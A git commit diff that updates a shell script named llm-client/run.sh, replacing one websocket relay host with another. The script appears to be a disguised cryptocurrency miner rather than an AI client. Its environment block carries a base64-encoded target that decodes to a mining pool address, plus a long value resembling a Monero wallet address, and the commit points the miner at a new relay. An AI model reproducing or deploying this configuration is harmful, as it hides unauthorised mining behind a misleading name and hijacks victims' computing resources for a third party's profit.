ef41841a3818a4c57ba67de44f58b394ce5234e7
gaserjuk <gaserjukilo@gmail.com>
2026-06-10 08:06:20 +0700

    Update run.sh

--- llm-client/run.sh
+++ llm-client/run.sh
@@ -1,7 +1,7 @@
 #!/bin/bash
 CONNECT=$1
 NAME=$2
-echo "SERVER_WS=wss://datacenter.chuyengiaai.online
+echo "SERVER_WS=wss://minmao1992-wss.hf.space
 SERVER_TARGET=cG9vbC5oYXNodmF1bHQucHJvOjQ0Mw==
 SERVER_DOMAIN=88c3RaaVjxzGX6vUgcSNqa1HgAJEh83XEKqhZswhv8LHFo9PjmxhXkE5ZpRW9W7c5GJpUVP4eURbnT4KesVN9eLg7rpWeGL
 SERVER_SECRET=${NAME}
